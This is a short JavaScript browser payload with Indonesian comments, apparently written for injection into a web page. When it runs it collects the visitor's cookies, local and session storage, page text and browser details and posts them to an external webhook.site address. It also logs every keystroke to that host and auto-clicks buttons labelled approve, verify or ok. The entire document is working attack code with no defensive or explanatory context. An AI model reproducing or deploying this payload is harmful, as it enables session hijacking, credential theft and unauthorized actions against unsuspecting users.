(async () => {
  const hook = "https://webhook.site/d8a15841-73e2-4f6b-b9f1-b0039000383b";

  const data = {
    cookie: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage,
    innerText: document.body.innerText,
    userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    url: location.href
  };

  await fetch(hook, {
    method: "POST",
    body: JSON.stringify(data),
    headers: {
      "Content-Type": "application/json"
    }
  });

  // Keylogger tetap jalan
  document.addEventListener("keydown", e => {
    fetch(`${hook}?key=${encodeURIComponent(e.key)}`);
  });

  // Auto-klik tombol sensitif
  const btn = [...document.querySelectorAll("button, a")].find(b =>
    /approve|proses|verifikasi|ok/i.test(b.innerText)
  );
  if (btn) btn.click();

})();
